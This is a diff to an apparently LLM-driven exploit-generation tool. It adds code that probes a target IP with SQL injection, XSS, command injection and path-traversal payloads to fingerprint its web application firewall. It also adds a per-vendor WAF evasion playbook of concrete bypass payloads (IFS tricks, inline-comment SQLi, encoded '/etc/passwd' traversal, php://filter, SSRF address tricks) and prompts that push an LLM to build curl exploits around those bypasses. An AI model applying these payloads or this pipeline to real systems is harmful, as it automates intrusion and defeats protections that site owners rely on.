@@ -13834,9 +13834,33 @@ def _recon_strategist(cve, product, version, recon_guidance, hint_guidance,
     if not (recon_guidance or hint_guidance or research_analysis):
         return ""
     tag_ver = f" ({product} {version})" if (product or version) else ""
+    # WAF-aware: parse the WAF family out of recon (if any) and pull the appropriate
+    # evasion playbook so the strategist can bake bypasses into the primary payload_hint
+    # rather than have refine flail against a block-page for 5 iterations.
+    waf_family = None
+    waf_line = ""
+    if recon_guidance and "WAF DETECTED" in recon_guidance:
+        import re as _re
+        m = _re.search(r"WAF FAMILY:\s*([a-z_]+)", recon_guidance)
+        if m:
+            waf_family = m.group(1)
+            waf_line = f"\n(Detected WAF family: {waf_family})"
+    waf_section = ""
+    if waf_family:
+        rce_ev = _waf_evasion_hint(waf_family, "RCE / COMMAND INJECTION")
+        sqli_ev = _waf_evasion_hint(waf_family, "SQL injection")
+        lfi_ev = _waf_evasion_hint(waf_family, "LFI / path traversal")
+        waf_section = (
+            f"\n\nWAF EVASION PLAYBOOK for {waf_family} (BAKE these into the primary.payload_hint "
+            f"— do NOT propose plain payloads that will get blocked):\n"
+            f"  - if class=RCE: {rce_ev}\n"
+            f"  - if class=SQLi: {sqli_ev}\n"
+            f"  - if class=LFI:  {lfi_ev}\n"
+            "The payload_hint MUST use one of these evasion techniques, not a plain payload."
+        )
     prompt = (
         "You are a pentest recon strategist. You have ALREADY collected everything below. "
-        f"Your job: pick the SINGLE most likely exploit path for {cve}{tag_ver} and phrase "
+        f"Your job: pick the SINGLE most likely exploit path for {cve}{tag_ver}{waf_line} and phrase "
         "it as concrete guidance for a synth agent that will emit a curl-based PoC.\n\n"
         "HARD RULES:\n"
         "- The `primary.endpoint` MUST be a path listed in RECON SIGNALS (ZAP-spidered or "
@@ -13844,7 +13868,10 @@ def _recon_strategist(cve, product, version, recon_guidance, hint_guidance,
         "  general training data. If you don't have a grounded endpoint, use `/`.\n"
         "- If Arjun CLASSIFIED HIGH-SIGNAL PARAMS lists an RCE/SQLi/LFI/SSTI target, that "
         "  target IS the primary unless you have equally strong evidence for something else.\n"
-        "- One primary. Two alternatives. No prose outside the JSON.\n\n"
+        "- If a WAF is detected (see WAF DETECTED in RECON), the payload_hint MUST use "
+        "  evasion techniques from the WAF EVASION PLAYBOOK below — NOT a plain payload.\n"
+        "- One primary. Two alternatives. No prose outside the JSON.\n"
+        f"{waf_section}\n\n"
         f"CVE: {cve}{tag_ver}\n"
         f"OPERATOR HINTS (authoritative):\n{hint_guidance or '(none)'}\n\n"
         f"RECON SIGNALS:\n{(recon_guidance or '(none)')[:5000]}\n\n"
@@ -14348,9 +14375,32 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
                            f"YOUR exploit injects (create/write/reflect it via {cve}), then "
                            f"read it back. Do not match a value that could already exist. Keep "
                            f"the exploit aimed at {orig[1] or 'the vulnerable endpoint'}.")
+        # WAF-block detection in the run output: if we see a fingerprint from
+        # _WAF_FINGERPRINTS in this iteration's output, the WAF just intercepted the
+        # payload. Tell the LLM to reach for evasion variants rather than another plain
+        # rewrite that will hit the same block.
+        waf_hit_note = ""
+        try:
+            for needle, name, family in _WAF_FINGERPRINTS:
+                if needle in (output or "") or needle.lower() in (output or "").lower():
+                    ev = _waf_evasion_hint(family, "SQL injection")
+                    ev_rce = _waf_evasion_hint(family, "RCE / COMMAND INJECTION")
+                    waf_hit_note = (
+                        f"\nWAF BLOCK detected in the output (fingerprint: `{needle[:24]}` "
+                        f"= {name}, family {family}). The plain payload was intercepted. "
+                        f"REWRITE using evasion variants — do NOT retry the same shape. "
+                        f"For SQLi try: {ev or 'case swap + inline comments + encoded quote'}. "
+                        f"For RCE try: {ev_rce or 'case swap + $IFS + backticks + hex escape'}. "
+                        f"Pick ONE variant and go."
+                    )
+                    _poc_trace(run_id, "waf_block_detected", iteration=it,
+                               response=f"family={family} needle=`{needle[:24]}` — evasion tips added to refine prompt")
+                    break
+        except Exception:  # noqa: BLE001
+            pass
         rprompt = (f"AUTHORIZED lab pentest. The PoC for {cve} on http://{ip}:{port} did NOT "
                    f"succeed.\nCommand: {command}\nOutput:\n{(output or '')[:1500]}{precond}"
-                   f"{escalation_guidance}{anchor_note}\nFix the command so it EXPLOITS {cve} and makes the proof "
+                   f"{waf_hit_note}{escalation_guidance}{anchor_note}\nFix the command so it EXPLOITS {cve} and makes the proof "
                    f"appear. Return ONE JSON object only: {{\"command\": \"<better command, may "
                    f"chain curl calls with ; and shell vars to fetch a token first>\", "
                    f"\"assertion\": {{\"expect_regex\": \"{canary or '<regex>'}\"}}}}. No prose.")
@@ -14631,6 +14681,195 @@ def _scout_open_ports(ip, primary_port, timeout=1.2):
         except Exception:  # noqa: BLE001
             pass
     return header + "\n" + "\n".join(lines)
+
+
+# WAF fingerprints: (needle-in-body-or-header, human-name, evasion-family). A hit on
+# any needle in ANY response tells us the target has this WAF. Ordered by specificity
+# so a Chinese-WAF match wins over a generic "blocked" match.
+_WAF_FINGERPRINTS = [
+    # (needle, name, evasion_family)
+    ("网站防火墙",                     "Chinese WAF (安全狗/宝塔/云锁 family)", "chinese_cms"),
+    ("请求带有不合法参数",              "Chinese WAF (bt/aegis)",              "chinese_cms"),
+    ("cf-ray",                          "Cloudflare",                          "cloudflare"),
+    ("cloudflare",                      "Cloudflare",                          "cloudflare"),
+    ("Attention Required! | Cloudflare","Cloudflare",                          "cloudflare"),
+    ("AWS WAF",                         "AWS WAF",                             "aws_waf"),
+    ("The request could not be satisfied", "AWS CloudFront/WAF",               "aws_waf"),
+    ("Access Denied",                   "Akamai / generic",                    "akamai"),
+    ("Reference #",                     "Akamai / F5",                         "akamai"),
+    ("Sucuri Website Firewall",         "Sucuri",                              "sucuri"),
+    ("Sucuri/Cloudproxy",               "Sucuri",                              "sucuri"),
+    ("mod_security",                    "ModSecurity",                         "modsecurity"),
+    ("modsecurity",                     "ModSecurity",                         "modsecurity"),
+    ("Not Acceptable!",                 "ModSecurity",                         "modsecurity"),
+    ("Incapsula incident ID",           "Imperva Incapsula",                   "incapsula"),
+    ("_Incapsula_Resource",             "Imperva Incapsula",                   "incapsula"),
+    ("The requested URL was rejected",  "F5 BIG-IP ASM",                       "f5_asm"),
+    ("Generated by Wordfence",          "Wordfence",                           "wordfence"),
+    ("wordfence",                       "Wordfence",                           "wordfence"),
+    ("blocked by the security rules",   "generic WAF",                         "generic"),
+    ("has been blocked",                "generic WAF",                         "generic"),
+]
+
+# Per-family payload variants the LLM should try when a WAF is detected. Grouped by
+# vulnerability class -> evasion techniques appropriate to that WAF family. Feeds into
+# the strategist prompt and the refine loop.
+_WAF_EVASION_PLAYBOOK = {
+    "chinese_cms": {  # 网站防火墙 etc — regex-based blocklist, weak against encoding/comments
+        "RCE / COMMAND INJECTION": [
+            "case swap: `?p=iD` `?p=Id`", "IFS bypass: `?p=id${IFS}-a` or `?p=id$IFS$9-a`",
+            "backtick chain: \"?p=\\`id\\`\"", "brace expand: `?p={id,-a}`",
+            "hex escape: `?p=$'\\x69\\x64'`", "encoded semicolon: `?p=id%3Bid`",
+            "printf: `?p=$(printf 'i\\x64')`",
+        ],
+        "SQL injection": [
+            "inline comments: `' /*!OR*/ '1'='1--`", "no-space UNION: `'UNION/**/SELECT`",
+            "case swap: `' Or '1'='1--`", "url-encoded: `%27+OR+%271%27%3D%271--`",
+            "double-encode: `%2527`", "backtick: `' OR `1`=`1--`", "hex: `0x27`",
+            "boolean-blind: `AND (SELECT 1 FROM (SELECT SLEEP(3))a)`",
+        ],
+        "LFI / path traversal": [
+            "double-encoding: `%252e%252e%252f`", "backslash: `..\\..\\..\\etc\\passwd`",
+            "unicode: `%c0%af`", "null byte: `../../../etc/passwd%00`",
+            "PHP wrapper: `php://filter/convert.base64-encode/resource=/etc/passwd`",
+        ],
+        "SSRF": [
+            "hex IP: `http://0x7f000001/`", "decimal: `http://2130706433/`",
+            "@ trick: `http://target@127.0.0.1/`", "DNS rebinding target",
+        ],
+    },
+    "cloudflare": {
+        "RCE / COMMAND INJECTION": [
+            "unusual charset: `?p=id&_=1`", "custom User-Agent (not curl)",
+            "Accept-Encoding tricks", "chunked transfer encoding",
+        ],
+        "SQL injection": [
+            "MySQL comment: `1/*!50000UNION*/SELECT`",
+            "case + comments: `Un/**/ion`", "encoded: `%c0%aeor%c0%ae`",
+        ],
+    },
+    "modsecurity": {
+        "RCE / COMMAND INJECTION": [
+            "case swap + IFS: `?p=Id$IFS-a`", "wildcards: `?p=/???/??`",
+            "brace expand", "$@ splitting", "encoded newlines: `%0a`",
+        ],
+        "SQL injection": [
+            "comment injection: `/*!50000*/`", "case swap all keywords",
+            "no-space with backticks: `'OR\\`1\\`=\\`1`",
+        ],
+    },
+    "aws_waf": {
+        "RCE / COMMAND INJECTION": [
+            "small chunks", "unusual method: PUT instead of GET",
+            "non-standard body encoding",
+        ],
+        "SQL injection": [
+            "encoded quote: `%2527`", "unicode alternatives",
+            "MySQL specific comment syntax",
+        ],
+    },
+    "generic": {
+        "RCE / COMMAND INJECTION": [
+            "case swap", "URL encoding", "double URL encoding",
+            "whitespace substitution (%09 tab, %20 space, %0a newline)",
+            "comment injection where syntax allows",
+        ],
+        "SQL injection": [
+            "case swap all keywords", "inline comments `/**/` between keywords",
+            "URL encoding of quotes and equals",
+        ],
+    },
+}
+
+
+def _waf_evasion_hint(waf_family, vuln_class):
+    """Return an evasion-hint string for this (waf_family, vuln_class) pair. Falls back
+    to the generic playbook if the family has no specific entry for this class."""
+    if not waf_family:
+        return ""
+    family_book = _WAF_EVASION_PLAYBOOK.get(waf_family, {})
+    generic_book = _WAF_EVASION_PLAYBOOK.get("generic", {})
+    # Try exact class match, then a class-family match, then generic
+    variants = family_book.get(vuln_class)
+    if not variants:
+        for k in family_book:
+            if any(w in vuln_class.upper() for w in k.upper().split()):
+                variants = family_book[k]
+                break
+    if not variants:
+        variants = generic_book.get(vuln_class, generic_book.get("SQL injection", []))
+    if not variants:
+        return ""
+    return "; ".join(variants[:6])
+
+
+def _scout_waf(ip, port, timeout=4):
+    """Detect a WAF sitting in front of the target. Sends four canary probes (SQLi, XSS,
+    LFI, command-injection) and diffs the responses against baseline for status/length
+    changes AND signature-matches for known WAF vendors (Cloudflare, AWS WAF, Sucuri,
+    ModSecurity, F5, 网站防火墙 / Chinese WAF families). Returns a guidance string that
+    tells the strategist and refine loop what evasion techniques to reach for. Empty
+    when no WAF is detected — the caller keeps the vanilla path."""
+    import httpx as _hx
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    probes = [
+        ("baseline",     "/"),
+        ("sqli",         "/?x=%27%20OR%20%271%27%3D%271--"),
+        ("xss",          "/?x=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
+        ("cmdi",         "/?x=%3Bid"),
+        ("lfi",          "/?x=..%2F..%2F..%2Fetc%2Fpasswd"),
+    ]
+    try:
+        with _hx.Client(verify=False, follow_redirects=False, timeout=timeout) as cli:
+            base_len = None; base_status = None
+            findings = []
+            waf_name = None; waf_family = None; triggered_by = None
+            for label, path in probes:
+                try:
+                    r = cli.get(base + path)
+                    body = (r.text or "")[:6000]
+                    hdrs = " ".join(f"{k}:{v}" for k, v in r.headers.items()).lower()
+                    if label == "baseline":
+                        base_len = len(body); base_status = r.status_code
+                        # Check headers for WAF fingerprints too (Server: cloudflare, etc.)
+                        for needle, name, family in _WAF_FINGERPRINTS:
+                            if needle.lower() in hdrs:
+                                waf_name = name; waf_family = family; triggered_by = f"header ({needle})"
+                                break
+                        continue
+                    # Length/status change signal
+                    delta_pct = abs(len(body) - (base_len or 0)) / max(1, base_len or 1)
+                    status_flip = (r.status_code != base_status) and r.status_code != 200
+                    # Signature match
+                    for needle, name, family in _WAF_FINGERPRINTS:
+                        if needle.lower() in body.lower() or needle in body:
+                            if not waf_name:
+                                waf_name = name; waf_family = family
+                            triggered_by = f"{label} probe -> body match `{needle[:24]}`"
+                            findings.append(f"{label}: BLOCKED (matched `{needle[:24]}`)")
+                            break
+                    else:
+                        # No explicit signature, but response is very different -> generic WAF
+                        if status_flip or delta_pct > 0.6:
+                            if not waf_name:
+                                waf_name = "generic WAF (heuristic)"
+                                waf_family = "generic"
+                                triggered_by = f"{label} probe -> {r.status_code} + Δ{int(delta_pct*100)}%"
+                            findings.append(f"{label}: anomalous ({r.status_code}, Δ{int(delta_pct*100)}%)")
+                        else:
+                            findings.append(f"{label}: passed (no WAF response)")
+                except Exception:  # noqa: BLE001
+                    findings.append(f"{label}: probe error")
+    except Exception:  # noqa: BLE001
+        return ""
+    if not waf_name:
+        return ""  # no WAF -> keep silent
+    return (f"WAF DETECTED: {waf_name} (family={waf_family}, triggered by "
+            f"{triggered_by}). Probe results: {' | '.join(findings)}. "
+            f"You MUST use evasion variants — do NOT send plain `' OR '1'='1--`, "
+            f"`;id`, `<script>` or `../../etc/passwd`; they will be blocked. "
+            f"WAF FAMILY: {waf_family}.")
 
 
 def _arjun_classify_param(name):
@@ -15006,6 +15245,17 @@ def _build_poc_core(cve, ip, port, product, version, eid, max_iters=3, research=
             if ps:
                 segments.append(ps)
                 _poc_trace(run_id, "recon:port_sweep", response=ps[:1200])
+            # WAF detection: always run, always cheap (~1s). If a WAF is fingerprinted,
+            # the strategist and refine loop will steer synth toward evasion variants
+            # instead of stock payloads that get blocked mid-request.
+            _t0 = _t.time()
+            waf_line = _scout_waf(ip, port)
+            recon_metrics["waf"] = {"seconds": round(_t.time() - _t0, 2),
+                                    "chars_added": len(waf_line or ""),
+                                    "signal": "WAF fingerprint + evasion family"}
+            if waf_line:
+                segments.append(waf_line)
+                _poc_trace(run_id, "recon:waf", response=waf_line[:1200])
             if want_basic:
                 _t0 = _t.time()
                 b = _scout_url_recon(ip, port)
